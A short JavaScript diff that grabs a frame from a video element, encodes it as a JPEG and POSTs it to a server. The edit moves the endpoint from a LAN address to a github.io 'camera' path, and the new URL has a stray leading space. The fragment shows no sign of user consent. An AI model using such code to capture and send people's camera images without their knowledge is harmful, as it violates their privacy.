@@ -21,7 +21,7 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const imageData = canvas.toDataURL('image/jpeg');
 
-      fetch('http://192.168.81.153:3000/send-photo', {
+      fetch(' https://abror305.github.io/camera/send-photo', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ image: imageData })
